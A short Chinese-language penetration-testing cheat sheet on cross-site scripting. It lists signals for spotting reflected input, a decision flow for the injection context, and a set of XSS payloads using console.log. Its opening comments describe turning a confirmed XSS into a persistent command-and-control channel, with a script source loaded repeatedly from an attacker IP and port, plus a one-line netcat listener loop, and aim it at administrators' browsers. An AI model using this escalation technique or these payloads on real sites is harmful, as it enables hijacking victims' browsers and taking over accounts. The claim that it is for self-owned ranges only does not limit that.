# 升级思考(2026-08 实战): 确认 XSS 后查是否可升级为持续代码执行——
# setInterval(fn,0)+动态 script src=//攻击者IP:端口 = 脚本热加载 C2(攻击者改服务器脚本, 受害者毫秒级执行新 JS);
# 攻击端一行 nc: while:;do printf ">";read c;echo $c|nc -vlp PORT /dev/null;done
# XSS=通道不是终点; 打中管理员/内网应用浏览器=等价任意操作权。合规: 仅自有靶场验证(TIER 3)
# §5 XSS
### 识别信号
- 用户输入回显到页面（评论/搜索/资料/URL参数）
### 决策流程
```
输入<>'"识别上下文 → HTML标签间/属性中/JS代码中/URL中
反射型=请求即执行 存储型=持久执行  DOM型=JS从URL取值写入
```
### Payload
```
<script>console.log('xss')</script>
<img src=x onerror=console.log('xss')>
<svg onload=console.log('xss')>
" onmouseover=console.log('xss') "   ' onclick=console.log('xss') '
';console.log('xss')//    javascript:console.log('xss')
```
